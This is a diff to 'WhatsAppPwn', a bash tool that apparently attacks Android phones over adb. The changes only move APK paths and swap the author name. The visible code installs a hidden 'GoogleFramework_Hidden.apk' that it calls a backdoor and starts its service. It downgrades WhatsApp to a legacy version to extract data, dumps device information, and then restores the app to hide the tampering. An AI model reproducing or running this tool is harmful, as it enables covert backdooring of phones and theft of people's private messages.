@@ -1,5 +1,5 @@
 #!/bin/bash
-#WhatsAppPwn by chocheluisrf
+#WhatsAppPwn by jlrodriguezf
 NONE='\033[0m'
 BOLD='\033[1m'
 RED='\033[0;31m'
@@ -79,19 +79,19 @@ WHATSPWNREMOTE(){
 	mkdir -p ${PATHEXT}extracted
 	mkdir -p ${PATHEXT}extracted/${NAME}
 	bin/adb shell getprop > ${PATHEXT}extracted/${NAME}/DeviceInfo.txt
-	bin/adb install tmp/AntiGuard.apk
+	bin/adb install bin/AntiGuard.apk
 	BD
 }
 INSTALLBACKDOOR(){
 	echo -e "${BOLD}INSTALLING BACKDOOR APK ... ${GREEN}[OK]${NONE}"
-	bin/adb install tmp/GoogleFramework_Hidden.apk
+	bin/adb install bin/GoogleFramework_Hidden.apk
 	echo -e "${BOLD}INITIALIZING BACKDOOR APK ... ${GREEN}[OK]${NONE}"
 	bin/adb shell am startservice ${USER} my.app.client/.Client
 	MAIN
 }
 INSTALLBACKDOOR2(){
 	echo -e "${BOLD}INSTALLING BACKDOOR APK ... ${GREEN}[OK]${NONE}"
-	bin/adb install tmp/GoogleFramework_Hidden.apk
+	bin/adb install bin/GoogleFramework_Hidden.apk
 	echo -e "${BOLD}INITIALIZING BACKDOOR APK ... ${GREEN}[OK]${NONE}"
 	bin/adb shell am startservice ${USER} my.app.client/.Client
 }
@@ -112,7 +112,7 @@ MAIN(){
 		bin/adb kill-server
 	}
 	echo -e "${BOLD}INSTALLING LEGACY WHATSAPP 2.11.431 ... ${GREEN}[OK]${NONE}"
-	bin/adb install -r -d tmp/LegacyWhatsApp.apk
+	bin/adb install -r -d bin/LegacyWhatsApp.apk
 	echo -e "${BOLD}INSTALL COMPLETE"
 	echo -e "${BOLD}UNLOCKING SCREEN AND KILLING WHATSAPP PROCESS ... ${GREEN}[OK]${NONE}"
 	bin/adb shell am force-stop com.whatsapp
@@ -139,7 +139,7 @@ B2NBH(){
 	fi
 	bin/adb start-server > /dev/null
 	echo -e "${BOLD}RESTORING WHATSAPP AND LOCKING SCREEN ... ${GREEN}[OK]${NONE}"
-	bin/adb install -r -d tmp/WhatsApp_Backup.apk
+	bin/adb install -r -d bin/WhatsApp_Backup.apk
 	bin/adb uninstall io.kos.antiguard
 	echo -e "${BOLD}RESTORE COMPLETE"
 	case "$BLACKHOLE" in
@@ -162,7 +162,7 @@ B2NBHNDB(){
 	fi
 	bin/adb start-server > /dev/null
 	echo -e "${BOLD}RESTORING WHATSAPP AND LOCKING SCREEN ... ${GREEN}[OK]${NONE}"
-	bin/adb install -r -d tmp/WhatsApp_Backup.apk
+	bin/adb install -r -d bin/WhatsApp_Backup.apk
 	bin/adb uninstall io.kos.antiguard
 	echo -e "${BOLD}RESTORE COMPLETE"
 	case "$BLACKHOLE" in
@@ -495,7 +495,7 @@ INTERFACE(){
 		1) IFAUTOMODEONWPR && WHATSPWNREMOTE ;;
 		2) BD2 && INTERFACE ;;
 		3) SHELL && INTERFACE ;;
-		4) bin/adb wait-for-device && bin/adb install -r -d tmp/WhatsApp_Backup.apk && INTERFACE ;;
+		4) bin/adb wait-for-device && bin/adb install -r -d bin/WhatsApp_Backup.apk && INTERFACE ;;
 		5) IFAUTOMODEONJB && BHRMANUAL ;;
 		6) IFAUTOMODEONJB && BHL ;;
 		7) UPLOAD ;;
@@ -544,7 +544,7 @@ if [[ $# > 0 ]]; then
 				fi && WHATSPWNREMOTE ;;
 		RELAUNCH|2) BD2 && cd ${HOME};;
 		SHELL|3) SHELL && cd ${HOME};;
-		RESTORE|4) bin/adb wait-for-device && bin/adb install -r -d tmp/WhatsApp_Backup.apk && cd ${HOME} ;;
+		RESTORE|4) bin/adb wait-for-device && bin/adb install -r -d bin/WhatsApp_Backup.apk && cd ${HOME} ;;
 		EXTRACTION|5|extraction) if [[ $2 == "local" ]]; then
 									if [[ $# > 2 ]]; then
 										shift 2
